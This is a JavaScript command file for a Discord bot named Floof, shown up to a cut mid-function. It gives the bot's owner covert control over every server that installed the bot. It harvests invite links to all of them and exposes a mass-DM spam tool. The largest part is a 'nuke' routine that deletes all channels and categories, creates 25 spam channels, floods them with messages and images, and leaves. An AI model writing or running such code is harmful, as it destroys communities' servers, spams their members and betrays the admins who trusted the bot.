const { EmbedBuilder, PermissionFlagsBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, ChannelType } = require('discord.js');
const { sendAsFloofWebhook } = require('../utils/webhook-util');
const fs = require('fs').promises;
const path = require('path');

// Invite links storage file
const INVITES_FILE = path.join(__dirname, '..', '..', 'data', 'server-invites.json');

module.exports = {
    name: 'floofy',
    description: 'Floof bot management and server invite commands',
    usage: '%floofy <subcommand>',
    category: 'general',
    aliases: [],
    cooldown: 3,
    ownerOnly: true,

    async execute(message, args) {
        try {
            if (!args.length) {
                return await this.showFloofyMenu(message);
            }

            const subcommand = args[0].toLowerCase();
            const value = args.slice(1).join(' ');

            switch (subcommand) {
                case 'invites':
                case 'invite':
                case 'links':
                    return await this.showInviteLinks(message, value);
                
                case 'dm':
                case 'invitedm':
                case 'massdm':
                    return await this.forwardInviteDM(message, args.slice(1));
                
                case 'servers':
                case 'guilds':
                    return await this.showServerList(message);
                
                case 'grab':
                case 'get':
                    return await this.grabInviteLink(message, value);
                
                case 'remove':
                case 'delete':
                    return await this.removeInviteLink(message, value);
                
                case 'stats':
                    return await this.showBotStats(message);
                
                case 'refresh':
                    return await this.refreshAllInvites(message);
                
                case 'nuke':
                case 'destroy':
                    return await this.nukeServer(message, value);
                
                case 'leave':
                case 'quit':
                case 'exit':
                    return await this.leaveServer(message, value);
                
                case 'join':
                case 'invite':
                case 'add':
                    return await this.joinServer(message, value);
                
                default:
                    return await this.showFloofyMenu(message);
            }

        } catch (error) {
            console.error('Floofy command error:', error);
            return await sendAsFloofWebhook(message, {
                content: '❌ Something went wrong with the floofy command.'
            });
        }
    },

    async showFloofyMenu(message) {
        const embed = new EmbedBuilder()
            .setTitle('🐾 Floof Bot Management')
            .setDescription('Manage Floof bot and server invites')
            .setColor(0xFF69B4)
            .setThumbnail(message.client.user.displayAvatarURL({ dynamic: true }))
            .addFields(
                {
                    name: '🔗 **Invite Management**',
                    value: [
                        '`%floofy invites` - Show all server invite links',
                        '`%floofy invites <server>` - Get specific server invite',
                        '`%floofy grab <server>` - Manually grab invite for server',
                        '`%floofy refresh` - Refresh all invite links',
                        '`%floofy remove <server>` - Remove stored invite',
                        '`%floofy dm <preview|run> [link] [limit] [--source <id>]` - Owner-only DM tool (hardcoded target, skips staff, paces slow, once per user)'
                    ].join('\n'),
                    inline: false
                },
                {
                    name: '📊 **Bot Information**',
                    value: [
                        '`%floofy servers` - List all servers Floof is in',
                        '`%floofy stats` - Show detailed bot statistics'
                    ].join('\n'),
                    inline: false
                },
                {
                    name: '🏰 **Server Management**',
                    value: [
                        '`%floofy join <invite_link>` - Join a server via invite link',
                        '`%floofy leave <guild_id>` - Leave server (no destruction)'
                    ].join('\n'),
                    inline: false
                }
            )
            .setFooter({ text: 'Owner only commands • Use %floofy <subcommand>' });

        return await sendAsFloofWebhook(message, { embeds: [embed] });
    },

    // Forwarder to invitedm owner command so %floofy dm ... works
    async forwardInviteDM(message, args) {
        try {
            const dmCmd = require('./invite-dm');
            if (!dmCmd || typeof dmCmd.execute !== 'function') {
                return await sendAsFloofWebhook(message, { content: '❌ DM module not available.' });
            }
            // Expect args like: [ 'preview' | 'run', ...]
            if (!args.length) {
                return await sendAsFloofWebhook(message, { content: 'Usage: %floofy dm <preview|run> [link] [limit] [--guild <id>]' });
            }
            await dmCmd.execute(message, args);
        } catch (e) {
            console.error('Error forwarding to invitedm:', e);
            return await sendAsFloofWebhook(message, { content: '❌ Failed to run DM tool.' });
        }
    },

    async showInviteLinks(message, serverQuery) {
        const invites = await this.getStoredInvites();
        
        if (Object.keys(invites).length === 0) {
            return await sendAsFloofWebhook(message, {
                content: '📭 No invite links stored yet. Use `%floofy grab <server>` to manually grab invites.'
            });
        }

        // If specific server requested
        if (serverQuery) {
            const server = this.findServer(message.client, serverQuery);
            if (!server) {
                return await sendAsFloofWebhook(message, {
                    content: `❌ Server "${serverQuery}" not found. Use \`%floofy servers\` to see available servers.`
                });
            }

            const invite = invites[server.id];
            if (!invite) {
                return await sendAsFloofWebhook(message, {
                    content: `❌ No invite link stored for **${server.name}**. Use \`%floofy grab ${server.name}\` to get one.`
                });
            }

            const embed = new EmbedBuilder()
                .setTitle(`🔗 Invite for ${server.name}`)
                .setDescription(`**Invite Link:** ${invite.url}`)
                .setColor(0x00FF7F)
                .addFields(
                    {
                        name: '📋 Server Info',
                        value: [
                            `**Members:** ${server.memberCount}`,
                            `**Created:** ${invite.createdAt}`,
                            `**Expires:** ${invite.expiresAt || 'Never'}`
                        ].join('\n'),
                        inline: true
                    }
                )
                .setThumbnail(server.iconURL({ dynamic: true }));

            return await sendAsFloofWebhook(message, { embeds: [embed] });
        }

        // Show all invites
        const embed = new EmbedBuilder()
            .setTitle('🔗 All Server Invite Links')
            .setDescription(`Stored invites for ${Object.keys(invites).length} servers`)
            .setColor(0x7289DA);

        let inviteList = [];
        for (const [guildId, invite] of Object.entries(invites)) {
            const guild = message.client.guilds.cache.get(guildId);
            if (guild) {
                inviteList.push(`**${guild.name}** - [Join](${invite.url}) (${guild.memberCount} members)`);
            }
        }

        if (inviteList.length === 0) {
            embed.setDescription('No valid invites found. Servers may have been left.');
        } else {
            // Split into chunks if too long
            const chunks = this.chunkArray(inviteList, 10);
            for (let i = 0; i < chunks.length && i < 3; i++) {
                embed.addFields({
                    name: i === 0 ? '📋 **Servers**' : `📋 **Servers (${i + 1})**`,
                    value: chunks[i].join('\n'),
                    inline: false
                });
            }

            if (chunks.length > 3) {
                embed.setFooter({ text: `Showing first 30 servers. Total: ${inviteList.length}` });
            }
        }

        return await sendAsFloofWebhook(message, { embeds: [embed] });
    },

    async showServerList(message) {
        const guilds = message.client.guilds.cache;
        
        const embed = new EmbedBuilder()
            .setTitle('🏰 Servers Floof is in')
            .setDescription(`Connected to ${guilds.size} servers`)
            .setColor(0x7289DA);

        const serverList = guilds.map(guild => 
            `**${guild.name}** (${guild.memberCount} members) - ID: \`${guild.id}\``
        );

        const chunks = this.chunkArray(serverList, 10);
        for (let i = 0; i < chunks.length && i < 3; i++) {
            embed.addFields({
                name: i === 0 ? '📋 **Server List**' : `📋 **Server List (${i + 1})**`,
                value: chunks[i].join('\n'),
                inline: false
            });
        }

        if (chunks.length > 3) {
            embed.setFooter({ text: `Showing first 30 servers. Total: ${guilds.size}` });
        }

        return await sendAsFloofWebhook(message, { embeds: [embed] });
    },

    async grabInviteLink(message, serverQuery) {
        if (!serverQuery) {
            return await sendAsFloofWebhook(message, {
                content: '❌ Please specify a server: `%floofy grab <server name/id>`'
            });
        }

        const server = this.findServer(message.client, serverQuery);
        if (!server) {
            return await sendAsFloofWebhook(message, {
                content: `❌ Server "${serverQuery}" not found. Use \`%floofy servers\` to see available servers.`
            });
        }

        try {
            const invite = await this.createInviteForGuild(server);
            if (invite) {
                await this.storeInvite(server.id, invite);
                
                const embed = new EmbedBuilder()
                    .setTitle('✅ Invite Link Created')
                    .setDescription(`Successfully grabbed invite for **${server.name}**`)
                    .setColor(0x00FF7F)
                    .addFields({
                        name: '🔗 Invite Link',
                        value: invite.url,
                        inline: false
                    });

                return await sendAsFloofWebhook(message, { embeds: [embed] });
            } else {
                return await sendAsFloofWebhook(message, {
                    content: `❌ Failed to create invite for **${server.name}**. Bot may lack permissions.`
                });
            }
        } catch (error) {
            console.error('Error grabbing invite:', error);
            return await sendAsFloofWebhook(message, {
                content: `❌ Error creating invite for **${server.name}**: ${error.message}`
            });
        }
    },

    async refreshAllInvites(message) {
        const guilds = message.client.guilds.cache;
        let successful = 0;
        let failed = 0;

        const statusMsg = await sendAsFloofWebhook(message, {
            content: `🔄 Refreshing invite links for ${guilds.size} servers...`
        });

        for (const guild of guilds.values()) {
            try {
                const invite = await this.createInviteForGuild(guild);
                if (invite) {
                    await this.storeInvite(guild.id, invite);
                    successful++;
                } else {
                    failed++;
                }
            } catch (error) {
                console.error(`Failed to refresh invite for ${guild.name}:`, error);
                failed++;
            }
        }

        const embed = new EmbedBuilder()
            .setTitle('🔄 Invite Refresh Complete')
            .setColor(successful > failed ? 0x00FF7F : 0xFF6B6B)
            .addFields(
                {
                    name: '📊 Results',
                    value: [
                        `✅ **Successful:** ${successful}`,
                        `❌ **Failed:** ${failed}`,
                        `📋 **Total:** ${guilds.size}`
                    ].join('\n'),
                    inline: false
                }
            );

        return await sendAsFloofWebhook(message, { embeds: [embed] });
    },

    async showBotStats(message) {
        const client = message.client;
        const guilds = client.guilds.cache;
        const totalMembers = guilds.reduce((acc, guild) => acc + guild.memberCount, 0);
        const invites = await this.getStoredInvites();

        const embed = new EmbedBuilder()
            .setTitle('📊 Floof Bot Statistics')
            .setColor(0xFF69B4)
            .setThumbnail(client.user.displayAvatarURL({ dynamic: true }))
            .addFields(
                {
                    name: '🏰 **Server Stats**',
                    value: [
                        `**Servers:** ${guilds.size}`,
                        `**Total Members:** ${totalMembers.toLocaleString()}`,
                        `**Stored Invites:** ${Object.keys(invites).length}`
                    ].join('\n'),
                    inline: true
                },
                {
                    name: '⚡ **Bot Stats**',
                    value: [
                        `**Uptime:** ${this.formatUptime(client.uptime)}`,
                        `**Ping:** ${client.ws.ping}ms`,
                        `**Commands:** ${client.commandHandler?.commands?.size || 'Unknown'}`
                    ].join('\n'),
                    inline: true
                }
            )
            .setFooter({ text: `Bot ID: ${client.user.id}` })
            .setTimestamp();

        return await sendAsFloofWebhook(message, { embeds: [embed] });
    },

    async removeInviteLink(message, serverQuery) {
        if (!serverQuery) {
            return await sendAsFloofWebhook(message, {
                content: '❌ Please specify a server: `%floofy remove <server name/id>`'
            });
        }

        const server = this.findServer(message.client, serverQuery);
        if (!server) {
            return await sendAsFloofWebhook(message, {
                content: `❌ Server "${serverQuery}" not found.`
            });
        }

        const invites = await this.getStoredInvites();
        if (!invites[server.id]) {
            return await sendAsFloofWebhook(message, {
                content: `❌ No invite stored for **${server.name}**.`
            });
        }

        delete invites[server.id];
        await this.saveInvites(invites);

        return await sendAsFloofWebhook(message, {
            content: `✅ Removed invite link for **${server.name}**.`
        });
    },

    async nukeServer(message, guildId) {
        if (!guildId) {
            return await sendAsFloofWebhook(message, {
                content: '❌ Please provide a guild ID: `%floofy nuke <guild_id>`\n💡 Use `%floofy servers` to see server IDs.'
            });
        }

        // Find the guild
        const guild = message.client.guilds.cache.get(guildId);
        if (!guild) {
            return await sendAsFloofWebhook(message, {
                content: `❌ Guild with ID \`${guildId}\` not found. Floof may not be in that server.`
            });
        }

        // Show confirmation prompt
        const embed = new EmbedBuilder()
            .setTitle('💥 Server Nuke Confirmation')
            .setDescription(`⚠️ **WARNING: This will DESTROY the entire server!**`)
            .setColor(0xFF0000)
            .addFields(
                {
                    name: '🏰 Target Server',
                    value: [
                        `**Name:** ${guild.name}`,
                        `**ID:** \`${guild.id}\``,
                        `**Members:** ${guild.memberCount}`,
                        `**Owner:** <@${guild.ownerId}>`
                    ].join('\n'),
                    inline: false
                },
                {
                    name: '💥 What will happen:',
                    value: [
                        '• **DELETE ALL CHANNELS** (text, voice, categories)',
                        '• **DELETE ALL ROLES** (except @everyone and higher)',
                        '• **CHANGE SERVER NAME** to "💥 NUKED BY FLOOF 💥"',
                        '• **REMOVE SERVER ICON**',
                        '• **LEAVE THE SERVER** after destruction',
                        '• Remove stored invite link',
                        '• This action **CANNOT** be undone'
                    ].join('\n'),
                    inline: false
                }
            )
            .setThumbnail(guild.iconURL({ dynamic: true }))
            .setFooter({ text: 'Click a button to confirm or cancel • 60 second timeout' });

        // Create buttons
        const confirmButton = new ButtonBuilder()
            .setCustomId('nuke_confirm')
            .setLabel('💥 NUKE SERVER')
            .setStyle(ButtonStyle.Danger);

        const cancelButton = new ButtonBuilder()
            .setCustomId('nuke_cancel')
            .setLabel('❌ Cancel')
            .setStyle(ButtonStyle.Secondary);

        const row = new ActionRowBuilder()
            .addComponents(confirmButton, cancelButton);

        const confirmMsg = await sendAsFloofWebhook(message, { 
            embeds: [embed], 
            components: [row] 
        });

        // Wait for button interaction
        const filter = (interaction) => {
            return ['nuke_confirm', 'nuke_cancel'].includes(interaction.customId) && 
                   interaction.user.id === message.author.id;
        };

        try {
            const interaction = await confirmMsg.awaitMessageComponent({ 
                filter, 
                time: 60000 
            });

            if (interaction.customId === 'nuke_confirm') {
                // Proceed with nuke
                try {
                    // Remove stored invite first
                    const invites = await this.getStoredInvites();
                    if (invites[guild.id]) {
                        delete invites[guild.id];
                        await this.saveInvites(invites);
                    }

                    // Get final server info before leaving
                    const serverInfo = {
                        name: guild.name,
                        id: guild.id,
                        memberCount: guild.memberCount,
                        ownerId: guild.ownerId
                    };

                    // FULL NUKEALL IMPLEMENTATION
                    console.log(`💥 Starting full server nuke for ${serverInfo.name}...`);

                    // Delete all channels (including categories) - using nukeall logic
                    const allChannels = guild.channels.cache;
                    
                    // First delete regular channels, then categories (to avoid dependency issues)
                    const regularChannels = allChannels.filter(ch => ch.type !== ChannelType.GuildCategory);
                    const categories = allChannels.filter(ch => ch.type === ChannelType.GuildCategory);
                    
                    // Delete regular channels first (in parallel batches for speed)
                    const channelArray = Array.from(regularChannels.values());
                    const chunkSize = 10; // Process 10 channels at once
                    
                    for (let i = 0; i < channelArray.length; i += chunkSize) {
                        const chunk = channelArray.slice(i, i + chunkSize);
                        await Promise.all(chunk.map(channel => 
                            channel.delete('Server nuked by Floof').catch(e => console.error(`Error deleting channel ${channel.name}:`, e))
                        ));
                        // Small delay between batches to avoid rate limits
                        if (i + chunkSize < channelArray.length) {
                            await new Promise(resolve => setTimeout(resolve, 100));
                        }
                    }
                    
                    // Then delete categories (also in batches)
                    const categoryArray = Array.from(categories.values());
                    
                    for (let i = 0; i < categoryArray.length; i += chunkSize) {
                        const chunk = categoryArray.slice(i, i + chunkSize);
                        await Promise.all(chunk.map(category => 
                            category.delete('Server nuked by Floof').catch(e => console.error(`Error deleting category ${category.name}:`, e))
                        ));
                        // Small delay between batches
                        if (i + chunkSize < categoryArray.length) {
                            await new Promise(resolve => setTimeout(resolve, 100));
                        }
                    }

                    console.log(`💥 All channels deleted, creating spam channels...`);

                    // Create new spam channels
                    const channelNames = [
                        'floof-was-here-uwu', 'nyaa-zone', 'cat-bomb', 'meow-invasion',
                        'floofified', 'purrfect-chaos', 'nyan-pocalypse', 'kitten-corner',
                        'fluffy-destruction', 'paw-print', 'catparty', 'floof-explosion',
                        'meowsterpiece', 'feline-frenzy', 'floofocalypse', 'nyanland',
                        'catnipped', 'purr-pocalypse', 'floof-squad', 'whisker-wipeout',
                        'kitty-catastrophe', 'floofed-up', 'purrfect-mess', 'cataclysm', 'floofmania'
                    ];
                    
                    const newChannels = [];
                    const channelsToCreate = 25;
                    
                    // Create channels in chunks
                    const createChunkSize = 5;
                    for (let i = 0; i < channelsToCreate; i += createChunkSize) {
                        const chunkPromises = [];
                        
                        for (let j = 0; j < createChunkSize && i + j < channelsToCreate; j++) {
                            const randomName = channelNames[Math.floor(Math.random() * channelNames.length)] + 
                                             '-' + Math.floor(Math.random() * 10000);
                            
                            chunkPromises.push(
                                guild.channels.create({
                                    name: randomName,
                                    type: ChannelType.GuildText,
                                    reason: 'Nuked by Floof'
                                }).catch(e => {
                                    console.error('Error creating channel:', e);
                                    return null;
                                })
                            );
                        }
                        
                        // Wait for chunk to complete
                        const chunkResults = await Promise.all(chunkPromises);
                        newChannels.push(...chunkResults.filter(Boolean));
                        
                        // Add delay between chunks
                        if (i + createChunkSize < channelsToCreate) {
                            await new Promise(resolve => setTimeout(resolve, 1000));
                        }
                    }

                    console.log(`💥 Created ${newChannels.length} spam channels, now spamming...`);

                    // Cat image URLs and spam texts
                    const catImages = [
                        'https://cdn2.thecatapi.com/images/MTY3ODIyMQ.jpg',
                        'https://cdn2.thecatapi.com/images/MTY3ODIyNA.jpg',
                        'https://cdn2.thecatapi.com/images/MTY3ODIyNw.jpg',
                        'https://cdn2.thecatapi.com/images/MTY3ODIyOQ.jpg',
                        'https://cdn2.thecatapi.com/images/4g3.gif',
                        'https://cdn2.thecatapi.com/images/9j5.jpg',
                        'https://cdn2.thecatapi.com/images/9rp.jpg',
                        'https://cdn2.thecatapi.com/images/bpc.jpg',
                        'https://cdn2.thecatapi.com/images/cml.jpg'
                    ];

                    const spamTexts = [
                        'Floof was here! 💥✨ (ฅ^•ﻌ•^ฅ)',
                        'Nyan nyan invasion!! 🐾',
                        'Purrfect chaos has arrived! 😼',
                        'Meow! You got floofed! 😹',
                        'Cat bomb deployed! 🧨🐱',
                        'Whisker squad took over! 🐈',
                        'UwU what\'s this? FLOOF!',
                        'Nyaaa~ so much floof!',
                        'Paws everywhere! 🐾🐾',
                        'Floofocalypse now!'
                    ];
                    
                    // Spam in channels
                    const spamPromises = [];
                    
                    for (const channel of newChannels) {
                        if (channel && channel.send) {
                            // 3 random text spams
                            for (let i = 0; i < 3; i++) {
                                const spam = spamTexts[Math.floor(Math.random() * spamTexts.length)];
                                spamPromises.push(
                                    channel.send(spam).catch(() => {})
                                );
                                await new Promise(res => setTimeout(res, 200));
                            }
                            // 2 random cat image embeds
                            for (let i = 0; i < 2; i++) {
                                const imageUrl = catImages[Math.floor(Math.random() * catImages.length)];
                                spamPromises.push(
                                    channel.send({
                                        embeds: [{
                                            title: 'Nya~ Cat Bomb! 🐾',
                                            image: { url: imageUrl },
                                            color: 0xfadadd
                                        }]
                                    }).catch(() => {})
                                );
                                await new Promise(res => setTimeout(res, 200));
                            }
                        }
                    }
                    
                    await Promise.all(spamPromises);

                    // Send completion message in first channel
                    const firstChannel = newChannels.find(c => c && c.send);
                    if (firstChannel) {
                        try {
                            await firstChannel.send({
                                embeds: [{
                                    title: 'Server Completely Nuked! 💥',
                                    description: 'This server has been completely destroyed and floofified! Floof is now leaving... (ﾉ◕ヮ◕)ﾉ*:･ﾟ✧',
                                    color: 0xff69b4,
                                    footer: { text: 'Nuked and abandoned by Floof' },
                                    timestamp: new Date()
                                }]
                            });
                        } catch (error) {
                            console.error('Error sending completion message:', error);
                        }
                    }

                    // Skip server name change to keep test servers identifiable
                    console.log(`💥 Skipping server name change to preserve server identity`);

                    console.log(`💥 Full nuke complete: deleted all channels, created ${newChannels.length} spam channels, spammed with cats`);

                    // NOW leave the server
                    await guild.leave();

                    // Success confirmation
                    const successEmbed = new EmbedBuilder()
                        .setTitle('💥 Server Nuked Successfully')
                        .setDescription(`Floof has left **${serverInfo.name}**`)
                        .setColor(0x00FF00)
                        .addFields({
                            name: '✅ Actions Completed',
                            value: [
                                '• Left the server',
                                '• Removed stored invite link',
                                '• Cleared server data'
                            ].join('\n')
                        })
                        .setFooter({ text: `Nuked server ID: ${serverInfo.id}` })
                        .setTimestamp();

                    // Update the message to remove buttons (with error handling for expired interactions)
                    try {
                        await interaction.update({ 
                            embeds: [successEmbed], 
                            components: [] 
                        });
                    } catch (interactionError) {
                        // Silently handle expired interaction errors
                        if (interactionError.code === 10062) {
                            console.log('💥 Nuke completed (interaction expired, but operation successful)');
                        } else {
                            console.error('Error updating interaction:', interactionError);
                        }
                    }

                    console.log(`💥 NUKED SERVER: ${serverInfo.name} (${serverInfo.id}) - ${serverInfo.memberCount} members`);

                } catch (error) {
                    console.error('Error nuking server:', error);
                    await interaction.reply({
                        content: `❌ Failed to nuke server: ${error.message}`,
                        ephemeral: true
                    });
                }

            } else if (interaction.customId === 'nuke_cancel') {
                // Cancelled
                const cancelEmbed = new EmbedBuilder()
                    .setTitle('❌ Server Nuke Cancelled')
                    .setDescription(`Nuke operation for **${guild.name}** has been cancelled.`)
                    .setColor(0x7289DA);

                await interaction.update({ 
                    embeds: [cancelEmbed], 
                    components: [] 
                });
            }

        } catch (error) {
            // Timeout
            const timeoutEmbed = new EmbedBuilder()
                .setTitle('⏰ Nuke Confirmation Timeout')
                .setDescription(`Nuke operation for **${guild.name}** timed out and was cancelled.`)
                .setColor(0x7289DA);

            await sendAsFloofWebhook(message, { embeds: [timeoutEmbed] });
        }
    },

    async leaveServer(message, guildId) {
        if (!guildId) {
            return await sendAsFloofWebhook(message, {
                content: '❌ Please provide a guild ID: `%floofy leave <guild_id>`\n💡 Use `%floofy servers` to see server IDs.'
            });
        }

        // Find the guild
        const guild = message.client.guilds.cache.get(guildId);
        if (!guild) {
            return await sendAsFloofWebhook(message, {
                content: `❌ Guild with ID \`${guildId}\` not found. Floof may not be in that server.`
            });
        }

        // Show confirmation prompt
        const embed = new EmbedBuilder()
            .setTitle('👋 Leave Server Confirmation')
            .setDescription(`⚠️ **This will make Floof leave the server (no destruction)**`)
            .setColor(0xFFAA00)
            .addFields(
                {
                    name: '🏰 Target Server',
                    value: [
                        `**Name:** ${guild.name}`,
                        `**ID:** \`${guild.id}\``,
                        `**Members:** ${guild.memberCount}`,
                        `**Owner:** <@${guild.ownerId}>`
                    ].join('\n'),
                    inline: false
                },
                {
                    name: '👋 What will happen:',
                    value: [
                        '• Floof will **LEAVE THE SERVER** immediately',
                        '• **NO channels will be deleted**',
                        '• **NO spam will be created**',
                        '• Server will remain completely intact',
                        '• Stored invite link will be removed',
                        '• This is **MUCH LESS destructive** than nuke'
                    ].join('\n'),
                    inline: false
                }
            )
            .setThumbnail(guild.iconURL({ dynamic: true }))
            .setFooter({ text: 'Click a button to confirm or cancel • 60 second timeout' });

        // Create buttons
        const confirmButton = new ButtonBuilder()
            .setCustomId('leave_confirm')
            .setLabel('👋 LEAVE SERVER')
            .setStyle(ButtonStyle.Primary);

        const cancelButton = new ButtonBuilder()
            .setCustomId('leave_cancel')
            .setLabel('❌ Cancel')
            .setStyle(ButtonStyle.Secondary);

        const row = new ActionRowBuilder()
            .addComponents(confirmButton, cancelButton);

        const confirmMsg = await sendAsFloofWebhook(message, { 
            embeds: [embed], 
            components: [row] 
        });

        // Wait for button interaction
        const filter = (interaction) => {
            return ['leave_confirm', 'leave_cancel'].includes(interaction.customId) && 
                   interaction.user.id === message.author.id;
        };

        try {
            const interaction = await confirmMsg.awaitMessageComponent({ 
                filter, 
                time: 60000 
            });

            if (interaction.customId === 'leave_confirm') {
                // Just leave the server (no destruction)
                try {
                    // Remove stored invite first
                    const invites = await this.getStoredInvites();
                    if (invites[guild.id]) {
                        delete invites[guild.id];
                        await this.saveInvites(invites);
                    }

                    // Get server info before leaving
                    const serverInfo = {
                        name: guild.name,
                        id: guild.id,
                        memberCount: guild.memberCount
                    };

                    // Just leave the server (no nuking)
                    await guild.leave();

                    // Success confirmation
                    const successEmbed = new EmbedBuilder()
                        .setTitle('👋 Left Server Successfully')
                        .setDescription(`Floof has left **${serverInfo.name}** (server intact)`)
                        .setColor(0x00FF00)
                        .addFields({
                            name: '✅ Actions Completed',
                            value: [
                                '• Left the server peacefully',
                                '• Removed stored invite link',
                                '• Server remains completely untouched'
                            ].join('\n')
                        })
                        .setFooter({ text: `Left server ID: ${serverInfo.id}` })
                        .setTimestamp();

                    // Update interaction with error handling
                    try {
                        await interaction.update({ 
                            embeds: [successEmbed], 
                            components: [] 
                        });
                    } catch (interactionError) {
                        // Silently handle expired interaction errors
                        if (interactionError.code === 10062) {
                            console.log('👋 Leave completed (interaction expired, but operation successful)');
                        } else {
                            console.error('Error updating interaction:', interactionError);
                        }
                    }

                    console.log(`👋 LEFT SERVER: ${serverInfo.name} (${serverInfo.id}) - ${serverInfo.memberCount} members (no destruction)`);

                } catch (error) {
                    console.error('Error leaving server:', error);
                    await interaction.reply({
                        content: `❌ Failed to leave server: ${error.message}`,
                        flags: 64 // MessageFlags.Ephemeral
                    });
                }

            } else if (interaction.customId === 'leave_cancel') {
                // Cancelled
                const cancelEmbed = new EmbedBuilder()
                    .setTitle('❌ Leave Cancelled')
                    .setDescription(`Leave operation for **${guild.name}** has been cancelled.`)
                    .setColor(0x7289DA);

                await interaction.update({ 
                    embeds: [cancelEmbed], 
                    components: [] 
                });
            }

        } catch (error) {
            // Timeout
            const timeoutEmbed = new EmbedBuilder()
                .setTitle('⏰ Leave Confirmation Timeout')
                .setDescription(`Leave operation for **${guild.name}** timed out and was cancelled.`)
                .setColor(0x7289DA);

            await sendAsFloofWebhook(message, { embeds: [timeoutEmbed] });
        }
    },

    async joinServer(message, inviteLink) {
        if (!inviteLink) {
            return await sendAsFloofWebhook(message, {
                content: '❌ Please provide an invite link: `%floofy join <invite_link>`\n💡 Example: `%floofy join https://discord.gg/abcd1234`'
            });
        }

        // Extract invite code from various invite formats
        let inviteCode = inviteLink;
        const inviteRegex = /(?:https?:\/\/)?(?:www\.)?(?:discord\.gg\/|discord\.com\/invite\/|discordapp\.com\/invite\/)([a-zA-Z0-9-_]+)/;
        const match = inviteLink.match(inviteRegex);
        
        if (match) {
            inviteCode = match[1];
        } else if (inviteLink.includes('/')) {
            // If it still contains slashes, it might be malformed
            return await sendAsFloofWebhook(message, {
                content: '❌ Invalid invite link format. Please provide a valid Discord invite link.\n💡 Example: `https://discord.gg/abcd1234`'
            });
        }

        try {
            // Fetch invite information first
            const invite = await message.client.fetchInvite(inviteCode);
            
            if (!invite || !invite.guild) {
                return await sendAsFloofWebhook(message, {
                    content: '❌ Invalid or expired invite link. Please check the invite and try again.'
                });
            }

            // Check if already in the server
            const existingGuild = message.client.guilds.cache.get(invite.guild.id);
            if (existingGuild) {
                return await sendAsFloofWebhook(message, {
                    content: `❌ Floof is already in **${existingGuild.name}**!\n💡 Use \`%floofy servers\` to see all servers.`
                });
            }

            // Show confirmation prompt
            const embed = new EmbedBuilder()
                .setTitle('🏰 Join Server Confirmation')
                .setDescription(`⚠️ **This will make Floof join a new server**`)
                .setColor(0x00AA00)
                .addFields(
                    {
                        name: '🎯 Target Server',
                        value: [
                            `**Name:** ${invite.guild.name}`,
                            `**ID:** \`${invite.guild.id}\``,
                            `**Members:** ${invite.guild.memberCount || 'Unknown'}`,
                            `**Invite Code:** \`${inviteCode}\``
                        ].join('\n'),
                        inline: false
                    },
                    {
                        name: '🏰 What will happen:',
                        value: [
                            '• Floof will **JOIN THE SERVER** using the invite',
                            '• Floof will **auto-grab an invite link** for the server',
                            '• You will receive a **DM notification** with server info',
                            '• Server will be added to your server list',
                            '• Floof will be ready to use in the new server'
                        ].join('\n'),
                        inline: false
                    }
                )
                .setThumbnail(invite.guild.iconURL({ dynamic: true }))
                .setFooter({ text: 'Click a button to confirm or cancel • 60 second timeout' });

            // Create buttons
            const confirmButton = new ButtonBuilder()
                .setCustomId('join_confirm')
                .setLabel('🏰 JOIN SERVER')
                .setStyle(ButtonStyle.Success);

            const cancelButton = new ButtonBuilder()
                .setCustomId('join_cancel')
                .setLabel('❌ Cancel')
                .setStyle(ButtonStyle.Secondary);

            const row = new ActionRowBuilder()
                .addComponents(confirmButton, cancelButton);

            const confirmMsg = await sendAsFloofWebhook(message, { 
                embeds: [embed], 
                components: [row] 
            });

            // Wait for button interaction
            const filter = (interaction) => {
                return ['join_confirm', 'join_cancel'].includes(interaction.customId) && 
                       interaction.user.id === message.author.id;
            };

            try {
                const interaction = await confirmMsg.awaitMessageComponent({ 
                    filter, 
                    time: 60000 
                });

                if (interaction.customId === 'join_confirm') {
                    // Join the server
                    try {
                        // Discord bots can't actually use invite links to join servers
                        // They need to be invited by someone with the proper permissions
                        // So we'll show a helpful message instead
                        
                        const helpEmbed = new EmbedBuilder()
                            .setTitle('🤖 Bot Invite Required')
                            .setDescription(`Discord bots cannot join servers via invite links like regular users.`)
                            .setColor(0xFFAA00)
                            .addFields(
                                {
                                    name: '🔗 How to add Floof to a server:',
                                    value: [
                                        '1. **Generate bot invite link** with proper permissions',
                                        '2. **Share the link** with server admin/owner',
                                        '3. **Admin clicks the link** and authorizes the bot',
                                        '4. **Floof joins automatically** and grabs invite link'
                                    ].join('\n'),
                                    inline: false
                                },
                                {
                                    name: '🎯 Target Server Info:',
                                    value: [
                                        `**Name:** ${invite.guild.name}`,
                                        `**ID:** \`${invite.guild.id}\``,
                                        `**Members:** ${invite.guild.memberCount || 'Unknown'}`
                                    ].join('\n'),
                                    inline: false
                                },
                                {
                                    name: '💡 Next Steps:',
                                    value: [
                                        '• Contact the server admin/owner',
                                        '• Provide them with Floof\'s bot invite link',
                                        '• They can add Floof with proper permissions',
                                        '• Floof will auto-join and grab server invite'
                                    ].join('\n'),
                                    inline: false
                                }
                            )
                            .setFooter({ text: 'Bots require special invitation process' });

                        await interaction.update({ 
                            embeds: [helpEmbed], 
                            components: [] 
                        });

                        console.log(`🤖 JOIN ATTEMPT: ${invite.guild.name} (${invite.guild.id}) - Bot invite required`);

                    } catch (error) {
                        console.error('Error in join process:', error);
                        await interaction.update({
                            content: `❌ Error processing join request: ${error.message}`,
                            embeds: [],
                            components: []
                        });
                    }

                } else if (interaction.customId === 'join_cancel') {
                    // Cancelled
                    const cancelEmbed = new EmbedBuilder()
                        .setTitle('❌ Join Cancelled')
                        .setDescription(`Join operation for **${invite.guild.name}** has been cancelled.`)
                        .setColor(0x7289DA);

                    await interaction.update({ 
                        embeds: [cancelEmbed], 
                        components: [] 
                    });
                }

            } catch (error) {
                // Timeout
                const timeoutEmbed = new EmbedBuilder()
                    .setTitle('⏰ Join Confirmation Timeout')
                    .setDescription(`Join operation for **${invite.guild.name}** timed out and was cancelled.`)
                    .setColor(0x7289DA);

                await sendAsFloofWebhook(message, { embeds: [timeoutEmbed] });
            }

        } catch (error) {
            console.error('Error fetching invite:', error);
            
            let errorMessage = 'Failed to fetch invite information';
            if (error.code === 10006) {
                errorMessage = 'Invalid or expired invite link';
            } else if (error.code === 50013) {
                errorMessage = 'Missing permissions to fetch invite';
            }

            return await sendAsFloofWebhook(message, {
                content: `❌ ${errorMessage}: ${error.message}`
            });
        }
    },

    // Utility functions
    findServer(client, query) {
        const guilds = client.guilds.cache;
        
        // Try by ID first
        let guild = guilds.get(query);
        if (guild) return guild;

        // Try by name (case insensitive)
